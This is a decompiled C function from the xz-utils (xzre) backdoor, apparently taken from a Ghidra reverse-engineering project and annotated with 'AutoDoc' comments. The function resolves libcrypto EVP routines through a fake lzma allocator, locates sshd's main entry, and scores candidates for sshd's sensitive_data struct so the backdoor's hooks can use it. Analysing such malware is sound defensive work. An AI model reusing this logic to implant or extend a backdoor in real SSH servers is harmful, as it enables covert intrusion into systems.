// /home/kali/xzre-ghidra/xzregh/105410_sshd_recon_bootstrap_sensitive_data.c
// Function: sshd_recon_bootstrap_sensitive_data @ 0x105410
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_recon_bootstrap_sensitive_data(elf_info_t * sshd, elf_info_t * libcrypto, string_references_t * refs, imported_funcs_t * funcs, global_context_t * ctx)


/*
 * AutoDoc: Bootstraps the entire sensitive-data pipeline: it first emits log breadcrumbs for `sshd_monitor_cmd_dispatch` and both socket helpers, zeroes the scratch batch, and re-roots the fake lzma allocator at libcrypto so every subsequent `lzma_alloc` call resolves EVP entry points (`EVP_Digest*`, `EVP_chacha20`, etc.) after verifying the `EVP_sm*` family still exists. It walks sshd's PT_LOAD spans to capture `.text`/`.data`, discovers the live `sshd_main` pointer, records whether the entry begins with ENDBR64, and extends the scan window through the trailing padding so both heuristics share the same bounds. The xcalloc and KRB5CCNAME passes then duke it out: each recovered pointer is scored via `sshd_score_sensitive_data_candidate`, the ctx publishes whichever candidate reaches >=8, and any failure tears down the temporary EVP handles before returning FALSE.
 */

#include "xzre_types.h"

BOOL sshd_recon_bootstrap_sensitive_data
               (elf_info_t *sshd,elf_info_t *libcrypto,string_references_t *refs,
               imported_funcs_t *funcs,global_context_t *ctx)

{
  Elf64_Addr digest_verify_addr;
  Elf64_Ehdr *libcrypto_header;
  u64 code_segment_span;
  u64 data_segment_span;
  u8 *code_start;
  u8 *code_segment_end;
  BOOL operation_ok;
  BOOL krb_candidate_found;
  uint xzcalloc_score;
  uint krb_score;
  lzma_allocator *allocator;
  pfn_EVP_DigestVerifyInit_t digest_verify_init;
  void *text_segment;
  Elf64_Sym *digest_verify_sym;
  Elf64_Sym *evp_sm_sym;
  u8 *data_start;
  pfn_EVP_CIPHER_CTX_new_t cipher_ctx_new;
  pfn_EVP_chacha20_t chacha20_ctor;
  long probe_clear_idx;
  secret_data_item_t *probe_cursor;
  sensitive_data *winning_candidate;
  u8 zero_stride;
  u64 code_segment_size;
  u64 data_segment_size;
  u8 *sshd_main_addr;
  u8 *code_scan_limit;
  sensitive_data *krb_candidate_local;
  sensitive_data *xzcalloc_candidate_local;
  secret_data_item_t secret_probe_items [4];
  
  zero_stride = 0;
  // AutoDoc: Emit breadcrumbs for the monitor command handlers so later refreshes can see that the recon code ran.
  operation_ok = secret_data_append_bits_from_addr_or_ret
                    ((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
  if (operation_ok == FALSE) {
    return FALSE;
  }
  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].bit_cursor = (secret_data_shift_cursor_t)0x1c8;
  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].operation_slot = 0x1b;
  // AutoDoc: Pre-populate a four-entry batch that records the proxy elevate helper plus the monitor socket discovery routines.
  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].anchor_pc = (u8 *)sshd_monitor_cmd_dispatch;
  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].bit_cursor = (secret_data_shift_cursor_t)0x1c8;
  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].operation_slot = 0x1c;
  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].anchor_pc = (u8 *)rsa_backdoor_command_dispatch;
  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].bits_to_shift = 0;
  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].ordinal = 1;
  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].bits_to_shift = 0;
  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].ordinal = 1;
  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].anchor_pc = (u8 *)sshd_find_socket_fd_by_shutdown_probe;
  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].bit_cursor = (secret_data_shift_cursor_t)0x1c3;
  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].operation_slot = 0x1a;
  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].bits_to_shift = 5;
  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].ordinal = 1;
  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].anchor_pc = (u8 *)sshd_get_monitor_comm_fd;
  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].bit_cursor = (secret_data_shift_cursor_t)0x1bd;
  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].operation_slot = 0x19;
  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].bits_to_shift = 6;
  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].ordinal = 1;
  // AutoDoc: Push all four breadcrumbs into the log in one shot; a failure here aborts before any ELF parsing happens.
  operation_ok = secret_data_append_items_batch(secret_probe_items,4,secret_data_append_item_if_enabled);
  if (operation_ok == FALSE) {
    return FALSE;
  }
  probe_cursor = secret_probe_items;
  // AutoDoc: Scrub the temporary append batch once it lands in the log so the stack copy can't be re-used or leaked.
  for (probe_clear_idx = 0x18; probe_clear_idx != 0; probe_clear_idx = probe_clear_idx + -1) {
    *(u32 *)&probe_cursor->anchor_pc = 0;
    probe_cursor = (secret_data_item_t *)((long)probe_cursor + (ulong)zero_stride * -8 + 4);
  }
  code_segment_size = 0;
  data_segment_size = 0;
  sshd_main_addr = (u8 *)0x0;
  code_scan_limit = (u8 *)0x0;
  krb_candidate_local = (sensitive_data *)0x0;
  xzcalloc_candidate_local = (sensitive_data *)0x0;
  // AutoDoc: Point the fake lzma allocator at libcrypto so subsequent `lzma_alloc` calls actually resolve EVP helpers.
  allocator = get_fake_lzma_allocator();
  // AutoDoc: Remember the target image so the allocator resolves symbols inside libcrypto instead of sshd.
  allocator->opaque = libcrypto;
  // AutoDoc: Resolve and pin each crypto helper by allocating a stub from libcrypto; success bumps `resolved_imports_count`.
  digest_verify_init = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator);
  funcs->EVP_DigestVerifyInit = digest_verify_init;
  if (digest_verify_init != (pfn_EVP_DigestVerifyInit_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  // AutoDoc: Grab sshd's text segment (and later the data segment) so both heuristics operate on real in-memory bounds.
  text_segment = elf_get_text_segment(sshd,&code_segment_size);
  code_segment_span = code_segment_size;
  if (text_segment == (void *)0x0) {
    return FALSE;
  }
  // AutoDoc: Check that libcrypto export tables still contain the EVP entry points the payload expects to hijack.
  digest_verify_sym = elf_gnu_hash_lookup_symbol(libcrypto,STR_EVP_DigestVerify,0);
  evp_sm_sym = elf_gnu_hash_lookup_symbol(libcrypto,STR_EVP_sm,0);
  if (evp_sm_sym == (Elf64_Sym *)0x0) {
    return FALSE;
  }
  // AutoDoc: Do the same for the writable PT_LOAD span so KRB5/xcalloc scans only walk sshd's `.data/.bss` window.
  data_start = (u8 *)elf_get_writable_tail_span(sshd,&data_segment_size,FALSE);
  data_segment_span = data_segment_size;
  if (data_start == (u8 *)0x0) {
    return FALSE;
  }
  if (digest_verify_sym != (Elf64_Sym *)0x0) {
    digest_verify_addr = digest_verify_sym->st_value;
    libcrypto_header = libcrypto->elfbase;
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)((u8 *)libcrypto_header + digest_verify_addr);
  }
  cipher_ctx_new = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator);
  funcs->EVP_CIPHER_CTX_new = cipher_ctx_new;
  if (cipher_ctx_new != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  // AutoDoc: Locate the actual `main()` body and remember its address for later scoring and hook decisions.
  operation_ok = sshd_find_main_from_entry_stub(&sshd_main_addr,sshd,libcrypto,funcs);
  code_start = sshd_main_addr;
  if (operation_ok == FALSE) {
    return FALSE;
  }
  // AutoDoc: Share the located `main()` pointer with the global context so every hook inspects the same entry.
  ctx->sshd_main_entry = sshd_main_addr;
  // AutoDoc: Capture whether sshd used CET/ENDBR64 so downstream patches can keep the landing pad intact.
  operation_ok = is_endbr32_or_64(sshd_main_addr,sshd_main_addr + 4,0xe230);
  // AutoDoc: Record the ENDBR result so later writers know whether the entry point must start with CET glue.
  ctx->uses_endbr64 = (uint)(operation_ok != FALSE);
  code_segment_end = (u8 *)((long)text_segment + code_segment_span);
  if ((operation_ok != FALSE) &&
     // AutoDoc: When CET is present, extend the `sshd_main` scan through the terminating NOP sled before handing those bounds to the heuristics.
     (operation_ok = find_function_bounds
                        (code_start,(void **)0x0,&code_scan_limit,code_start,(u8 *)((long)text_segment + code_segment_span),
                         FIND_NOP), code_segment_end = code_scan_limit, operation_ok == FALSE)) {
    return FALSE;
  }
  code_scan_limit = code_segment_end;
  // AutoDoc: Use the xcalloc heuristic to find a struct candidate by following the xcalloc(result) stores into .bss.
  operation_ok = sshd_find_sensitive_data_base_via_xcalloc
                    (data_start,data_start + data_segment_span,code_start,code_scan_limit,refs,&xzcalloc_candidate_local);
  // AutoDoc: Run the independent KRB5CCNAME-based scan in parallel so two separate heuristics can vote on the same address.
  krb_candidate_found = sshd_find_sensitive_data_base_via_krb5ccname
                    (data_start,data_start + data_segment_span,code_start,code_scan_limit,&krb_candidate_local,sshd);
  chacha20_ctor = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator);
  winning_candidate = xzcalloc_candidate_local;
  funcs->EVP_chacha20 = chacha20_ctor;
  if (chacha20_ctor != (pfn_EVP_chacha20_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  if (operation_ok == FALSE) {
LAB_00105772:
    if (krb_candidate_found == FALSE) goto LAB_001057d3;
    xzcalloc_score = 0;
LAB_001057a6:
    krb_score = sshd_score_sensitive_data_candidate(krb_candidate_local,sshd,refs);
  }
  else {
    if (krb_candidate_found != FALSE) {
      if (xzcalloc_candidate_local == krb_candidate_local) {
        // AutoDoc: Score whichever candidate(s) were recovered; the function only accepts pointers that reach eight or more points.
        xzcalloc_score = sshd_score_sensitive_data_candidate(xzcalloc_candidate_local,sshd,refs);
        if (xzcalloc_score < 8) {
          return FALSE;
        }
        goto LAB_0010575e;
      }
      xzcalloc_score = sshd_score_sensitive_data_candidate(xzcalloc_candidate_local,sshd,refs);
      goto LAB_001057a6;
    }
    if (operation_ok == FALSE) goto LAB_00105772;
    xzcalloc_score = sshd_score_sensitive_data_candidate(xzcalloc_candidate_local,sshd,refs);
    krb_score = 0;
  }
  // AutoDoc: Pick the higher-scoring struct (ties favour xcalloc) but only after it clears the eight-point threshold.
  if (((krb_score <= xzcalloc_score) && (winning_candidate = xzcalloc_candidate_local, 7 < xzcalloc_score)) ||
     ((xzcalloc_score <= krb_score && (winning_candidate = krb_candidate_local, 7 < krb_score)))) {
LAB_0010575e:
    // AutoDoc: Persist the winning pointer into the global context so every hook can dereference sshd's sensitive_data struct.
    ctx->sshd_sensitive_data = winning_candidate;
    return TRUE;
  }
LAB_001057d3:
  // AutoDoc: Tear down any temporary EVP handles when discovery fails so the loader does not leak libcrypto objects.
  lzma_free(funcs->EVP_DigestVerifyInit,allocator);
  lzma_free(funcs->EVP_CIPHER_CTX_new,allocator);
  lzma_free(funcs->EVP_chacha20,allocator);
  return FALSE;
}

